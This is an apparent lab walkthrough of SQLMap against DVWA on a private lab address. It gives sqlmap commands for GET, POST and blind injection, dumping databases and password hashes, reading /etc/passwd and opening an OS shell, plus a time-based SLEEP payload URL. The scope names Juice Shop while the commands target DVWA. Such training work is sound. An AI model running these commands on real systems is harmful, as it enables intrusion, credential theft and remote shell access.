# SQLMap For SQL Injection



## Scope
- **Attacker**: Kali Linux (Use SQLMap)
- **Victim**: Owasp Juice Shop




## What is SQLMap?



---

# SQLMap Methodology

---


## 1. Get session Cookies 

### Using cURL to Get Session

#### Get session ID by logging in
````
curl -c cookies.txt -d "username=admin&password=password&Login=Login" \
  "http://192.168.127.129/dvwa/login.php"
````
<img width="770" height="95" alt="image" src="https://github.com/user-attachments/assets/fbc0f0ae-b591-4dca-a958-d8a47dbfb8e5" />

#### View the cookies
````
cat cookies.txt
````
<img width="978" height="210" alt="image" src="https://github.com/user-attachments/assets/c204ddaa-5ae3-4681-9b51-cc94f4aed2af" />


### Browser developer tools
 - Login to DVWA
 - Press F12 → Network tab
 - Refresh page
 - Copy Cookie value from any request
  
<img width="1917" height="577" alt="image" src="https://github.com/user-attachments/assets/79420442-779c-49be-befe-d2c7eeb715ef" />

<img width="1920" height="860" alt="image" src="https://github.com/user-attachments/assets/231c738b-c505-4477-9398-a62f7ae4efd4" />

- this my `Cookie`:
````
PHPSESSID=64a18e92a18ba786a311b699aa6a8d78
````

---


## 2. Basic SQL Injection Testing

### Low security Level 
#### GET-based SQL injection
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" \
  --batch
````
<img width="1547" height="740" alt="image" src="https://github.com/user-attachments/assets/da124d86-391a-4c16-957c-71f81b0eb6a1" />

- We can type this `Payload` in browser like this:
````
http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20(SELECT%205291%20FROM%20(SELECT(SLEEP(5)))KgHa)--%20Tlcf&Submit=Submit
````
<img width="1322" height="636" alt="image" src="https://github.com/user-attachments/assets/8edec9fe-5ad4-4073-b29b-76a89e040457" />



#### With specific parameter testing
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -p id --batch
````
<img width="1418" height="704" alt="image" src="https://github.com/user-attachments/assets/2da81803-d5e9-4bfd-94a0-5aafed2424af" />

- `-p id`: Tells SQLMap to test the `id` parameter for injection.
- `--batch`: Runs in non-interactive mode, automatically uses default answers to prompts (great for scripting or automation).
- **This command is ideal for:
• 	Authenticated SQL injection testing in DVWA
• 	Automated exploitation in exam/lab environments**


### Medium Security Level:

#### POST-based SQL injection

````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=medium" --batch
````
<img width="1423" height="820" alt="image" src="https://github.com/user-attachments/assets/53d6cf53-e394-4fc6-9acb-292631a7c144" />



### High Security Level:

#### Testing with different session
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=high" --batch
````




## 3. Database Enumeration

### Get database banner and version
````

sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --banner --current-user --current-db --batch
````



### List all databases
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=Y64a18e92a18ba786a311b699aa6a8d78; security=low" --dbs --batch
````


### List tables in DVWA database
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -D dvwa --tables --batch
````


### Dump users table
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78D; security=low" -D dvwa -T users --dump --batch
````


### Dump all tables from dvwa database
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -D dvwa --dump-all --batch
````




## 4. Advanced Enumeration Techniques

### Get database users and privileges
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --users --passwords --privileges --batch
````



### Get database schema
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --schema --batch
````



### Check if user is DBA
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --is-dba --batch
````

---


##  5. File System Operations 
### Read local files
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --file-read="/etc/passwd" --batch
````


### Check if file write is possible
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --os-shell  --batch
````



---




## 6. Blind SQL Injection Testing
### Boolean-based blind SQLi
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --technique=B --batch
````


### Time-based blind SQLi
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --technique=T --batch
````



---


## 






































